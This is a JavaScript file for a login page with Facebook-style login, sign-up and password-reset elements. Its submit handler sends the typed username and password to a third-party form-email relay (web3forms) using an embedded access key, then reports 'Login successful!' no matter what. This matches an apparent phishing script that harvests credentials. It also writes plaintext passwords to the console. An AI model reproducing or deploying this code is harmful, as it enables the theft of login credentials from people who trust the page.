// Add interactivity and enhance functionality for the login form

// Cursor customization (if required)
const cursor = document.querySelector('.cursor');
document.addEventListener('mousemove', (e) => {
    cursor.style.left = `${e.pageX}px`;
    cursor.style.top = `${e.pageY}px`;
});

// Handle form submission
document.getElementById('login-form').addEventListener('submit', function (e) {
    e.preventDefault(); // Prevent the default form submission

    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    if (username && password) {
        console.log('Login submitted:', { username, password });

        // Simulate form submission or send data via fetch
        fetch('https://api.web3forms.com/submit', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                access_key: '7e1a64be-a463-4e47-ad90-d4caf4f206af',
                username,
                password,
            }),
        })
            .then((response) => {
                if (response.ok) {
                    return response.json();
                } else {
                    throw new Error('Login failed');
                }
            })
            .then((data) => {
                alert('Login successful!');
                console.log('Response:', data);
            })
            .catch((error) => {
                console.error('Error:', error);
                alert('An error occurred while logging in.');
            });
    } else {
        alert('Please fill in all fields.');
    }
});

// Handle Facebook login button
document.querySelector('.facebook-login').addEventListener('click', () => {
    alert('Facebook login is currently unavailable.');
});

// Placeholder for "Sign up" and "Forgot password?" links
document.querySelector('.signup-container a').addEventListener('click', (e) => {
    e.preventDefault();
    alert('Sign up functionality is not implemented yet.');
});

document.querySelector('.login-form a[href="kl"]').addEventListener('click', (e) => {
    e.preventDefault();
    alert('Forgot password functionality is not implemented yet.');
});
